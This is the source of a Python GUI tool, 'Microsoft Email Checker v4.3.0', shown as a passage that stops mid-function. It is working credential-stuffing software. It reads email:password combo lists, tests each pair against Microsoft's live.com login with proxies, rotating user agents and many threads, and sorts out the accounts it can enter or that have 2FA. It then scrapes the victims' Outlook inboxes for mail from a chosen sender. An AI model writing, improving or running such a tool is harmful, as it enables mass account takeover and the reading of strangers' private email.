#!/usr/bin/env python3
"""
Microsoft Email Checker v4.3.0 - Session Cookie Scraping
Uses authenticated session cookies to scrape Outlook web interface
No API tokens needed - just session cookies from OAuth login
"""

import requests
import re
import threading
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import time
from datetime import datetime, timedelta
import os
import random
import json
from urllib.parse import urlparse, parse_qs, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

class MicrosoftEmailCheckerV43:
    def __init__(self, root):
        self.root = root
        self.root.title("Microsoft Email Checker v4.3.0 - Session Scraping")
        self.root.geometry("1400x800")
        self.root.configure(bg='#1a1a1a')
        
        # Core variables
        self.combo_file = None
        self.proxy_file = None
        self.proxies = []
        self.running = False
        self.paused = False
        self.start_time = None
        self.total_combos = 0
        
        # Results
        self.full_access = []
        self.twofa_valid = []
        self.failed = []
        
        # Email detection variables
        self.enable_inbox_search = tk.BooleanVar(value=True)
        self.inbox_search_email = tk.StringVar(value="facebookmail.com")
        self.use_mobile_fallback = tk.BooleanVar(value=True)
        self.add_delays = tk.BooleanVar(value=True)
        self.email_found = []
        self.no_email = []
        self.email_count = 0
        self.no_email_count = 0
        
        # Method tracking
        self.method_stats = {
            'owa_api_success': 0,
            'html_scrape_success': 0,
            'mobile_scrape_success': 0,
            'all_failed': 0,
            'inbox_checks_performed': 0
        }
        
        # Counters
        self.checked = 0
        self.success_count = 0
        self.twofa_count = 0
        self.failed_count = 0
        self.retry_count = 0
        
        # Threading
        self.lock = threading.Lock()
        self.threads = tk.IntVar(value=10)  # Reduced for safety
        
        # Settings
        self.auto_scroll = tk.BooleanVar(value=True)
        self.use_proxies = tk.BooleanVar(value=False)
        self.max_retries = tk.IntVar(value=3)
        self.check_delay = tk.DoubleVar(value=1.5)  # Delay between accounts
        
        # User agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
        ]
        
        # OAuth URL (Xbox scope - DO NOT CHANGE)
        self.OAUTH_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        
        # Microsoft domains
        self.MICROSOFT_DOMAINS = {
            'hotmail.com', 'outlook.com', 'live.com', 'msn.com',
            'hotmail.co.uk', 'hotmail.fr', 'live.co.uk', 'live.fr',
            'outlook.fr', 'outlook.es', 'outlook.de', 'hotmail.de',
            'live.de', 'hotmail.it', 'live.it', 'passport.com',
            'windowslive.com', 'hotmail.es', 'live.com.mx', 'hotmail.com.mx',
            'hotmail.com.br', 'live.com.br', 'outlook.com.br',
            'hotmail.com.ar', 'live.com.ar', 'outlook.com.ar'
        }
        
        # Build UI
        self.setup_ui()
        self.setup_shortcuts()
        
    def setup_ui(self):
        """Create professional UI with session scraping controls"""
        
        # Main container
        main_container = tk.Frame(self.root, bg='#1a1a1a')
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Header
        header_frame = tk.Frame(main_container, bg='#1a1a1a')
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        title_label = tk.Label(header_frame, 
                              text="Microsoft Email Checker v4.3.0", 
                              font=("Segoe UI", 20, "bold"),
                              fg='#00bcf2', bg='#1a1a1a')
        title_label.pack(side=tk.LEFT)
        
        subtitle = tk.Label(header_frame,
                           text="Session Cookie Scraping Method",
                           font=("Segoe UI", 10),
                           fg='#90ff90', bg='#1a1a1a')
        subtitle.pack(side=tk.LEFT, padx=(20, 0))
        
        # Control panel
        control_frame = tk.Frame(main_container, bg='#2d2d2d', relief=tk.RIDGE, bd=1)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        
        # File selection row
        file_frame = tk.Frame(control_frame, bg='#2d2d2d')
        file_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Button(file_frame, text="📁 Select Combos",
                 command=self.select_combo_file,
                 bg='#0078d4', fg='white',
                 font=("Segoe UI", 10, "bold"),
                 padx=15, pady=8,
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(file_frame, text="🔐 Load Proxies",
                 command=self.load_proxies,
                 bg='#5d5d5d', fg='white',
                 font=("Segoe UI", 10),
                 padx=15, pady=8,
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.LEFT, padx=(0, 10))
        
        self.file_label = tk.Label(file_frame,
                                  text="No file selected",
                                  font=("Segoe UI", 10),
                                  fg='#aaaaaa', bg='#2d2d2d')
        self.file_label.pack(side=tk.LEFT, padx=(10, 0))
        
        # Settings row 1
        settings_frame = tk.Frame(control_frame, bg='#2d2d2d')
        settings_frame.pack(fill=tk.X, padx=10, pady=(0, 5))
        
        tk.Label(settings_frame, text="Threads:",
                font=("Segoe UI", 9),
                fg='white', bg='#2d2d2d').pack(side=tk.LEFT)
        
        thread_spin = tk.Spinbox(settings_frame, from_=1, to=20,
                                textvariable=self.threads,
                                width=5, font=("Segoe UI", 9))
        thread_spin.pack(side=tk.LEFT, padx=(5, 20))
        
        tk.Label(settings_frame, text="Delay (sec):",
                font=("Segoe UI", 9),
                fg='white', bg='#2d2d2d').pack(side=tk.LEFT)
        
        delay_spin = tk.Spinbox(settings_frame, from_=0.5, to=5.0, increment=0.5,
                               textvariable=self.check_delay,
                               width=5, font=("Segoe UI", 9))
        delay_spin.pack(side=tk.LEFT, padx=(5, 20))
        
        tk.Label(settings_frame, text="Max Retries:",
                font=("Segoe UI", 9),
                fg='white', bg='#2d2d2d').pack(side=tk.LEFT)
        
        retry_spin = tk.Spinbox(settings_frame, from_=1, to=5,
                               textvariable=self.max_retries,
                               width=5, font=("Segoe UI", 9))
        retry_spin.pack(side=tk.LEFT, padx=(5, 20))
        
        # Inbox search settings
        tk.Label(settings_frame, text="Search for:",
                font=("Segoe UI", 9),
                fg='white', bg='#2d2d2d').pack(side=tk.LEFT, padx=(20, 5))
        
        inbox_entry = tk.Entry(settings_frame, 
                              textvariable=self.inbox_search_email,
                              width=20, 
                              font=("Segoe UI", 9))
        inbox_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        # Settings row 2
        settings_frame2 = tk.Frame(control_frame, bg='#2d2d2d')
        settings_frame2.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Checkbutton(settings_frame2, text="Enable inbox search",
                      variable=self.enable_inbox_search,
                      fg='white', bg='#2d2d2d',
                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(0, 15))
        
        tk.Checkbutton(settings_frame2, text="Use mobile fallback",
                      variable=self.use_mobile_fallback,
                      fg='white', bg='#2d2d2d',
                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(0, 15))
        
        tk.Checkbutton(settings_frame2, text="Add delays (safer)",
                      variable=self.add_delays,
                      fg='white', bg='#2d2d2d',
                      selectcolor='#2d2d2d').pack(side=tk.LEFT, padx=(0, 15))
        
        tk.Checkbutton(settings_frame2, text="Use Proxies",
                      variable=self.use_proxies,
                      fg='white', bg='#2d2d2d',
                      selectcolor='#2d2d2d').pack(side=tk.LEFT)
        
        self.proxy_status = tk.Label(settings_frame2,
                                    text="No proxies loaded",
                                    font=("Segoe UI", 9),
                                    fg='#888888', bg='#2d2d2d')
        self.proxy_status.pack(side=tk.RIGHT, padx=10)

        # Statistics cards
        stats_frame = tk.Frame(main_container, bg='#1a1a1a')
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Full Access card
        success_card = tk.Frame(stats_frame, bg='#107c10', relief=tk.RIDGE, bd=1)
        success_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        tk.Label(success_card, text="✅ Full Access",
                font=("Segoe UI", 9),
                fg='white', bg='#107c10').pack(pady=(2,0))
        self.success_label = tk.Label(success_card, text="0",
                                     font=("Segoe UI", 16, "bold"),
                                     fg='white', bg='#107c10')
        self.success_label.pack(pady=(0,0))
        self.email_breakdown = tk.Label(success_card, 
                                        text="📧 Found: 0 | 📭 Not Found: 0",
                                        font=("Segoe UI", 8),
                                        fg='#c0ffc0', bg='#107c10')
        self.email_breakdown.pack(pady=(0,3))
        
        # 2FA Valid card
        twofa_card = tk.Frame(stats_frame, bg='#0078d4', relief=tk.RIDGE, bd=1)
        twofa_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        tk.Label(twofa_card, text="🔐 2FA Valid",
                font=("Segoe UI", 9),
                fg='white', bg='#0078d4').pack(pady=(5,0))
        self.twofa_label = tk.Label(twofa_card, text="0",
                                   font=("Segoe UI", 18, "bold"),
                                   fg='white', bg='#0078d4')
        self.twofa_label.pack(pady=(0,5))
        
        # Failed card
        failed_card = tk.Frame(stats_frame, bg='#d13438', relief=tk.RIDGE, bd=1)
        failed_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        tk.Label(failed_card, text="❌ Failed",
                font=("Segoe UI", 9),
                fg='white', bg='#d13438').pack(pady=(5,0))
        self.failed_label = tk.Label(failed_card, text="0",
                                    font=("Segoe UI", 18, "bold"),
                                    fg='white', bg='#d13438')
        self.failed_label.pack(pady=(0,5))
        
        # Scraping Methods card
        method_card = tk.Frame(stats_frame, bg='#5d5d5d', relief=tk.RIDGE, bd=1)
        method_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(5, 0))
        tk.Label(method_card, text="🌐 Scraping Methods",
                font=("Segoe UI", 9),
                fg='white', bg='#5d5d5d').pack(pady=(2,0))
        self.method_label = tk.Label(method_card, text="Not tested",
                                    font=("Segoe UI", 8),
                                    fg='white', bg='#5d5d5d')
        self.method_label.pack(pady=(2,3))
        
        # Progress bar
        progress_frame = tk.Frame(main_container, bg='#1a1a1a')
        progress_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.progress_bar = ttk.Progressbar(progress_frame, 
                                           length=950,
                                           mode='determinate')
        self.progress_bar.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        self.percent_label = tk.Label(progress_frame, text="0%",
                                     font=("Segoe UI", 10, "bold"),
                                     fg='#00bcf2', bg='#1a1a1a')
        self.percent_label.pack(side=tk.LEFT, padx=(10, 0))
        
        self.speed_label = tk.Label(progress_frame, text="0/min",
                                   font=("Segoe UI", 9),
                                   fg='#888888', bg='#1a1a1a')
        self.speed_label.pack(side=tk.LEFT, padx=(10, 0))
        
        self.session_status = tk.Label(progress_frame, text="🍪 Session: Not established",
                                      font=("Segoe UI", 9),
                                      fg='#ffb900', bg='#1a1a1a')
        self.session_status.pack(side=tk.RIGHT, padx=(10, 0))
    
        # SPLIT PANEL
        split_container = tk.Frame(main_container, bg='#1a1a1a')
        split_container.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # LEFT PANEL - Activity log
        left_panel = tk.Frame(split_container, bg='#2d2d2d', relief=tk.RIDGE, bd=1)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        left_header = tk.Frame(left_panel, bg='#404040')
        left_header.pack(fill=tk.X)
        
        tk.Label(left_header, text="📝 SESSION SCRAPING LOG",
                font=("Segoe UI", 10, "bold"),
                fg='white', bg='#404040').pack(side=tk.LEFT, padx=10, pady=5)
        
        tk.Checkbutton(left_header, text="Auto-scroll",
                      variable=self.auto_scroll,
                      fg='white', bg='#404040',
                      selectcolor='#404040').pack(side=tk.RIGHT, padx=10)
        
        self.log_text = scrolledtext.ScrolledText(left_panel,
                                                  bg='#1e1e1e', fg='#cccccc',
                                                  font=("Consolas", 9),
                                                  height=20, width=60,
                                                  wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
        
        # RIGHT PANEL
        right_panel = tk.Frame(split_container, bg='#2d2d2d', relief=tk.RIDGE, bd=1)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        # Full Access section
        access_header = tk.Frame(right_panel, bg='#107c10')
        access_header.pack(fill=tk.X)
        
        self.access_title = tk.Label(access_header, text="✅ FULL ACCESS (0)",
                                    font=("Segoe UI", 10, "bold"),
                                    fg='white', bg='#107c10')
        self.access_title.pack(side=tk.LEFT, padx=10, pady=5)
        
        tk.Button(access_header, text="Copy",
                 command=self.copy_full_access,
                 bg='#0e5a0e', fg='white',
                 font=("Segoe UI", 8),
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.RIGHT, padx=10, pady=3)
        
        self.access_text = scrolledtext.ScrolledText(right_panel,
                                                     bg='#0d4f0d', fg='#90ff90',
                                                     font=("Consolas", 10),
                                                     height=10, width=50,
                                                     wrap=tk.NONE)
        self.access_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=(0,5))
        
        # 2FA Valid section
        twofa_header = tk.Frame(right_panel, bg='#0078d4')
        twofa_header.pack(fill=tk.X)
        
        self.twofa_title = tk.Label(twofa_header, text="🔐 2FA VALID (0)",
                                   font=("Segoe UI", 10, "bold"),
                                   fg='white', bg='#0078d4')
        self.twofa_title.pack(side=tk.LEFT, padx=10, pady=5)
        
        tk.Button(twofa_header, text="Copy",
                 command=self.copy_twofa,
                 bg='#005a9e', fg='white',
                 font=("Segoe UI", 8),
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.RIGHT, padx=10, pady=3)
        
        self.twofa_text = scrolledtext.ScrolledText(right_panel,
                                                    bg='#003d6d', fg='#90d4ff',
                                                    font=("Consolas", 10),
                                                    height=10, width=50,
                                                    wrap=tk.NONE)
        self.twofa_text.pack(fill=tk.BOTH, expand=True, padx=1, pady=(0,1))
        
        # Control buttons
        button_frame = tk.Frame(main_container, bg='#1a1a1a')
        button_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.start_btn = tk.Button(button_frame, text="▶️ Start",
                                  command=self.start_checking,
                                  bg='#107c10', fg='white',
                                  font=("Segoe UI", 11, "bold"),
                                  padx=25, pady=10,
                                  relief=tk.FLAT,
                                  cursor='hand2',
                                  state=tk.DISABLED)
        self.start_btn.pack(side=tk.LEFT, padx=2)
        
        self.pause_btn = tk.Button(button_frame, text="⏸️ Pause",
                                  command=self.toggle_pause,
                                  bg='#ffb900', fg='black',
                                  font=("Segoe UI", 11, "bold"),
                                  padx=25, pady=10,
                                  relief=tk.FLAT,
                                  cursor='hand2',
                                  state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=2)
        
        self.stop_btn = tk.Button(button_frame, text="⏹️ Stop",
                                 command=self.stop_checking,
                                 bg='#d13438', fg='white',
                                 font=("Segoe UI", 11, "bold"),
                                 padx=25, pady=10,
                                 relief=tk.FLAT,
                                 cursor='hand2',
                                 state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=2)
        
        tk.Button(button_frame, text="💾 Export All",
                 command=self.export_all,
                 bg='#0078d4', fg='white',
                 font=("Segoe UI", 11, "bold"),
                 padx=25, pady=10,
                 relief=tk.FLAT,
                 cursor='hand2').pack(side=tk.LEFT, padx=2)
        
        # Status bar
        self.status_bar = tk.Label(main_container,
                                  text="Status: Ready | Session Cookie Scraping",
                                  font=("Segoe UI", 9),
                                  fg='#888888', bg='#1a1a1a',
                                  anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
    
    def setup_shortcuts(self):
        """Setup keyboard shortcuts"""
        self.root.bind('<Control-o>', lambda e: self.select_combo_file())
        self.root.bind('<Control-s>', lambda e: self.export_all())
    
    def check_inbox_with_session(self, session, email, token):
        """Check inbox using authenticated session cookies"""
        
        if not self.enable_inbox_search.get():
            return False, "DISABLED", 0
        
        search_email = self.inbox_search_email.get().lower().strip()
        self.log(f"🔍 Checking inbox for: {search_email}", "info")
        
        # Get random user agent
        user_agent = random.choice(self.user_agents)
        
        # Base headers for all requests
        headers = {
            'User-Agent': user_agent,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # Step 1: Establish Outlook session
        try:
            self.log(f"Establishing Outlook session...", "info")
            
            outlook_home = session.get(
                'https://outlook.live.com/mail/0/',
                headers=headers,
                timeout=15,
                allow_redirects=True
            )
            
            if outlook_home.status_code == 200:
                self.session_status.config(text="🍪 Session: Established ✅")
                self.log(f"✅ Outlook session established", "success")
            else:
                self.log(f"Failed to establish session: {outlook_home.status_code}", "error")
                return False, "SESSION_FAIL", 0
                
        except Exception as e:
            self.log(f"Session establishment error: {str(e)[:100]}", "error")
            return False, "SESSION_ERROR", 0
        
        # Extract canary token
        canary = None
        canary_patterns = [
            r'"SessionId":"([^"]+)"',
            r'data-canary="([^"]+)"',
            r'"canary":"([^"]+)"',
            r'X-OWA-CANARY":"([^"]+)"'
        ]
        
        for pattern in canary_patterns:
            match = re.search(pattern, outlook_home.text)
            if match:
                canary = match.group(1)
                self.log(f"Canary token extracted: {canary[:20]}...", "info")
                break
        
        # METHOD 1: Try OWA Internal API
        try:
            self.log(f"Testing OWA API method...", "info")
            
            owa_url = 'https://outlook.live.com/owa/0/service.svc?action=GetConversationItems&app=Mail'
            
            owa_headers = headers.copy()
            owa_headers.update({
                'Content-Type': 'application/json',
                'Action': 'GetConversationItems',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://outlook.live.com/mail/0/inbox'
            })
            
            if canary:
                owa_headers['X-OWA-CANARY'] = canary
            
            # Simplified payload
            payload = {
                "Folder": {"__type": "FolderId:#Exchange", "Id": "inbox"},
                "MaxItemsToReturn": 50
            }
            
            response = session.post(
                owa_url,
                headers=owa_headers,
                json=payload,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    # Parse response for email addresses
                    response_text = json.dumps(data).lower()
                    
                    if search_email in response_text:
                        self.log(f"✅ OWA API: Found {search_email}!", "success")
                        self.session_status.config(text="🍪 Method: OWA API ✅")
                        
                        with self.lock:
                            self.method_stats['owa_api_success'] += 1
                            self.method_stats['inbox_checks_performed'] += 1
                        
                        return True, "OWA_API", 1
                    
                except:
                    pass
                    
        except Exception as e:
            self.log(f"OWA API error: {str(e)[:100]}", "warning")
        
        # METHOD 2: HTML Scraping
        try:
            self.log(f"Testing HTML scraping method...", "info")
            
            inbox_url = 'https://outlook.live.com/mail/0/inbox'
            
            headers['Referer'] = 'https://outlook.live.com/mail/0/'
            headers['X-Requested-With'] = 'XMLHttpRequest'
            
            response = session.get(
                inbox_url,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                text = response.text.lower()
                
                # Multiple patterns for finding email addresses
                patterns = [
                    r'"from":\s*\{[^}]*"address":\s*"([^"]+)"',
                    r'"sender":[^{]*\{[^}]*"emailAddress":[^{]*\{[^}]*"address":"([^"]+)"',
                    r'data-from="([^"]+)"',
                    r'"EmailAddress":\s*"([^"]+)"',
                    r'"email":\s*"([^"]+)"',
                    r'&lt;([^@]+@[^&]+)&gt;'
                ]
                
                found = False
                for pattern in patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    for match in matches:
                        if search_email in match.lower():
                            found = True
                            self.log(f"✅ HTML Scrape: Found {match}", "success")
                            break
                    if found:
                        break
                
                if found:
                    self.session_status.config(text="🍪 Method: HTML Scrape ✅")
                    
                    with self.lock:
                        self.method_stats['html_scrape_success'] += 1
                        self.method_stats['inbox_checks_performed'] += 1
                    
                    return True, "HTML_SCRAPE", 1
                
                # Check if we're seeing inbox content at all
                if 'inbox' in text and ('message' in text or 'email' in text):
                    self.log(f"Inbox loaded but no {search_email} found", "info")
                else:
                    self.log(f"May not have loaded inbox content properly", "warning")
                    
        except Exception as e:
            self.log(f"HTML scraping error: {str(e)[:100]}", "warning")
        
        # METHOD 3: Mobile Interface (if enabled)
        if self.use_mobile_fallback.get():
            try:
                self.log(f"Testing mobile interface fallback...", "info")
                
                mobile_headers = {
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                
                mobile_url = 'https://outlook.live.com/m/'
                
                response = session.get(
                    mobile_url,
                    headers=mobile_headers,
                    timeout=15,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    text = response.text.lower()
                    
                    if search_email in text:
                        self.log(f"✅ Mobile: Found {search_email}!", "success")
                        self.session_status.config(text="🍪 Method: Mobile ✅")
                        
                        with self.lock:
                            self.method_stats['mobile_scrape_success'] += 1
                            self.method_stats['inbox_checks_performed'] += 1
                        
                        return True, "MOBILE", 1
                        
            except Exception as e:
                self.log(f"Mobile fallback error: {str(e)[:100]}", "warning")
        
        # All methods failed
        self.log(f"❌ No {search_email} found in inbox", "error")
        self.session_status.config(text="🍪 No emails found ❌")
        
        with self.lock:
            self.method_stats['all_failed'] += 1
            self.method_stats['inbox_checks_performed'] += 1
        
        return False, "NOT_FOUND", 0
    
    def select_combo_file(self):
        """Select combo file"""
        filename = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not filename:
            return
            
        self.combo_file = filename
        microsoft_count = 0
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if ':' in line:
                        try:
                            email = line.split(':')[0].strip().lower()
                            if '@' in email:
                                domain = email.split('@')[1]
                                for ms_domain in self.MICROSOFT_DOMAINS:
                                    if domain.endswith(ms_domain):
                                        microsoft_count += 1
                                        break
                        except:
                            pass
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {str(e)}")
            return
        
        self.total_combos = microsoft_count
        self.file_label.config(text=f"{os.path.basename(filename)} ({microsoft_count:,} MS accounts)")
        self.start_btn.config(state=tk.NORMAL)
        self.log(f"✅ Loaded {microsoft_count:,} Microsoft accounts", "success")
        
    def load_proxies(self):
        """Load proxy list"""
        filename = filedialog.askopenfilename(
            title="Select Proxy File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if not filename:
            return
            
        try:
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            
            self.proxy_status.config(text=f"{len(self.proxies)} proxies")
            self.log(f"🔐 Loaded {len(self.proxies)} proxies", "info")
            
            if len(self.proxies) > 0:
                self.use_proxies.set(True)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load proxies: {str(e)}")
    
    def get_proxy(self):
        """Get random proxy for request"""
        if self.use_proxies.get() and self.proxies:
            proxy = random.choice(self.proxies)
            
            if '@' in proxy:
                parts = proxy.split('@')
                auth = parts[0]
                server = parts[1]
                proxy_url = f"http://{auth}@{server}"
            elif proxy.count(':') == 3:
                parts = proxy.split(':')
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                proxy_url = f"http://{proxy}"
            
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        return None
    
    def log(self, message, level="info"):
        """Add message to log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        colors = {
            "success": "#90ff90",
            "twofa": "#90d4ff",
            "error": "#ff9090",
            "warning": "#ffb900",
            "info": "#cccccc"
        }
        
        color = colors.get(level, "#cccccc")
        formatted = f"[{timestamp}] {message}\n"
        
        self.log_text.insert(tk.END, formatted, level)
        self.log_text.tag_config(level, foreground=color)
        
        if self.auto_scroll.get():
            self.log_text.see(tk.END)
        
        self.root.update_idletasks()
    
    def update_stats(self):
        """Update statistics"""
        with self.lock:
            self.success_label.config(text=str(self.success_count))
            self.twofa_label.config(text=str(self.twofa_count))
            self.failed_label.config(text=str(self.failed_count))
            
            search_term = self.inbox_search_email.get().split('.')[0].capitalize()
            self.email_breakdown.config(
                text=f"📧 {search_term}: {self.email_count} | 📭 No {search_term}: {self.no_email_count}"
            )
            
            # Update method statistics
            if self.method_stats['inbox_checks_performed'] > 0:
                method_text = (
                    f"OWA: {self.method_stats['owa_api_success']} | "
                    f"HTML: {self.method_stats['html_scrape_success']} | "
                    f"Mobile: {self.method_stats['mobile_scrape_success']}"
                )
                if self.method_stats['all_failed'] > 0:
                    method_text += f"\nNot Found: {self.method_stats['all_failed']}"
                self.method_label.config(text=method_text)
            
            self.access_title.config(text=f"✅ FULL ACCESS ({self.success_count})")
            self.twofa_title.config(text=f"🔐 2FA VALID ({self.twofa_count})")
            
            if self.total_combos > 0:
                progress = (self.checked / self.total_combos) * 100
                self.progress_bar['value'] = progress
                self.percent_label.config(text=f"{progress:.1f}%")
            
            if self.start_time and self.checked > 0:
                elapsed = time.time() - self.start_time
                speed = (self.checked / elapsed) * 60
                self.speed_label.config(text=f"{speed:.0f}/min")

    def oauth_authenticate(self, email, password):
        """OAuth authentication with session scraping"""
        session = requests.Session()
        user_agent = random.choice(self.user_agents)
        session.headers.update({'User-Agent': user_agent})
        
        # Apply proxy if enabled
        if self.use_proxies.get():
            proxy = self.get_proxy()
            if proxy:
                session.proxies = proxy
        
        tries = 0
        while tries < self.max_retries.get():
            try:
                # Step 1: GET OAuth page
                response = session.get(self.OAUTH_URL, timeout=15)
                text = response.text
                
                # Extract PPFT token
                sftag = None
                patterns = [
                    r'name="PPFT"[^>]*value="([^"]+)"',
                    r'name=\\"PPFT\\"[^>]*value=\\"([^"\\]+)'
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, text)
                    if match:
                        sftag = match.group(1)
                        break
                
                if not sftag:
                    self.log(f"Failed to extract PPFT for {email}", "error")
                    return "ERROR"
                
                # Extract URL POST
                url_post = None
                match = re.search(r'"urlPost":"([^"]+)"', text)
                if match:
                    url_post = match.group(1)
                
                if not url_post:
                    url_post = "https://login.live.com/ppsecure/post.srf"
                
                if not url_post.startswith('http'):
                    url_post = 'https://login.live.com' + url_post
                
                # Step 2: POST credentials
                data = {
                    'login': email,
                    'loginfmt': email,
                    'passwd': password,
                    'PPFT': sftag
                }
                
                login_response = session.post(url_post, data=data, timeout=15, allow_redirects=True)
                
                # Step 3: Check response
                response_text = login_response.text.lower()
                response_url = login_response.url
                
                # SUCCESS - Has access token
                if '#' in response_url and 'access_token=' in response_url:
                    token = parse_qs(urlparse(response_url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        self.log(f"✅ OAuth success for {email}", "success")
                        
                        # Add delay if enabled
                        if self.add_delays.get():
                            delay = self.check_delay.get()
                            self.log(f"Waiting {delay}s before inbox check...", "info")
                            time.sleep(delay)
                        
                        # Check inbox using session cookies
                        has_match, method_used, email_count = self.check_inbox_with_session(
                            session, email, token
                        )
                        
                        # Update counters and lists
                        with self.lock:
                            self.success_count += 1
                            self.full_access.append(f"{email}:{password}")
                            
                            if has_match:
                                self.email_found.append(f"{email}:{password}")
                                self.email_count += 1
                                search_term = self.inbox_search_email.get().split('.')[0].upper()
                                indicator = f" [📧 {search_term} - {method_used}]"
                                log_type = "success"
                            else:
                                self.no_email.append(f"{email}:{password}")
                                self.no_email_count += 1
                                search_term = self.inbox_search_email.get().split('.')[0].capitalize()
                                indicator = f" [📭 No {search_term}]"
                                log_type = "info"
                        
                        # Update UI
                        self.access_text.insert(tk.END, f"{email}:{password}{indicator}\n")
                        self.access_text.see(tk.END)
                        self.log(f"✅ FULL ACCESS{indicator}: {email}", log_type)
                        return "SUCCESS"
                
                # 2FA DETECTED
                if 'cancel?mkt=' in response_text or 'proofs' in response_text:
                    with self.lock:
                        self.twofa_count += 1
                        self.twofa_valid.append(f"{email}:{password}")
                    
                    self.twofa_text.insert(tk.END, f"{email}:{password}\n")
                    self.twofa_text.see(tk.END)
                    self.log(f"🔐 2FA VALID: {email}", "twofa")
                    return "2FA"
                
                # INVALID PASSWORD
                if 'password is incorrect' in response_text or 'account doesn\'t exist' in response_text:
                    with self.lock:
                        self.failed_count += 1
                        self.failed.append(email)
                    
                    self.log(f"❌ Failed: {email}", "error")
                    return "INVALID"
                
                # Retry on unknown response
                tries += 1
                with self.lock:
                    self.retry_count += 1
                
                if tries < self.max_retries.get():
                    time.sleep(2)
                    
            except requests.exceptions.RequestException as e:
                tries += 1
                with self.lock:
                    self.retry_count += 1
                
                if tries >= self.max_retries.get():
                    with self.lock:
                        self.failed_count += 1
                    self.log(f"Network error: {email} - {str(e)[:50]}", "error")
                    return "ERROR"
                
                time.sleep(2)
            
            except Exception as e:
                with self.lock:
                    self.failed_count += 1
                self.log(f"Unexpected error: {email} - {str(e)[:50]}", "error")
                return "ERROR"
        
        # Max retries reached
        with self.lock:
            self.failed_count += 1
        return "FAILED"
    
    def worker(self, combo):
        """Worker thread for checking accounts"""
        if not self.running:
            return
            
        while self.paused and self.running:
            time.sleep(0.1)
            
        try:
            parts = combo.strip().split(':')
            if len(parts) >= 2:
                email = parts[0].strip()
                password = ':'.join(parts[1:]).strip()
                
                # Check if Microsoft domain
                domain = email.split('@')[1].lower()
                is_microsoft = False
                for ms_domain in self.MICROSOFT_DOMAINS:
                    if domain.endswith(ms_domain):
                        is_microsoft = True
                        break
                
                if is_microsoft:
                    self.oauth_authenticate(email, password)
                    
        except:
            pass
        finally:
            with self.lock:
                self.checked += 1
            self.update_stats()
    
    def start_checking(self):
        """Start checking process"""
        if self.running:
            return
            
        # Reset counters
        self.checked = 0
        self.success_count = 0
